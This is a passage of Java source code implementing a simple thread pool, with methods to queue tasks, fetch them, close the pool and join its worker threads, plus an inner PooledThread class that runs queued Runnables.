		 * executes on the next available idle thread in this ThreadPool.
		 * <p>
		 * Tasks start execution in the order they are received.
		 *
		 * @param task
		 *            The task to run. If null, no action is taken.
		 * @throws IllegalStateException
		 *             if this ThreadPool is already closed.
		 */
		public synchronized void runTask(Runnable task) {
			if (!isAlive) {
				throw new IllegalStateException();
			}
			if (task != null) {
				taskQueue.add(task);
				notify();
			}

		}

		protected synchronized Runnable getTask() throws InterruptedException {
			while (taskQueue.size() == 0) {
				if (!isAlive) {
					return null;
				}
				wait();
			}
			return (Runnable) taskQueue.removeFirst();
		}

		/**
		 * Closes this ThreadPool and returns immediately. All threads are stopped,
		 * and any waiting tasks are not executed. Once a ThreadPool is closed, no
		 * more tasks can be run on this ThreadPool.
		 */
		public synchronized void close() {
			if (isAlive) {
				isAlive = false;
				taskQueue.clear();
				interrupt();
			}
		}

		/**
		 * Closes this ThreadPool and waits for all running threads to finish. Any
		 * waiting tasks are executed.
		 */
		public void join() {
			// notify all waiting threads that this ThreadPool is no
			// longer alive
			synchronized (this) {
				isAlive = false;
				notifyAll();
			}

			// wait for all threads to finish
			Thread[] threads = new Thread[activeCount()];
			int count = enumerate(threads);
			for (int i = 0; i < count; i++) {
				try {
					threads[i].join();
				} catch (InterruptedException ex) {
				}
			}
		}

		/**
		 * A PooledThread is a Thread in a ThreadPool group, designed to run tasks
		 * (Runnables).
		 */
		private class PooledThread extends Thread {

			public PooledThread() {
				super(ThreadPool.this, "PooledThread-" + (threadID++));
			}

			public void run() {
				while (!isInterrupted()) {

					// get a task to run
					Runnable task = null;
					try {
						task = getTask();
					} catch (InterruptedException ex) {
					}

					// if getTask() returned null or was interrupted,
					// close this thread by returning.
					if (task == null) {
						return;
					}

					// run the task, and eat any exceptions it throws
					try {
						task.run();
					} catch (Throwable t) {
						uncaughtException(this, t);
					}
				}
			}
		}
	}
}
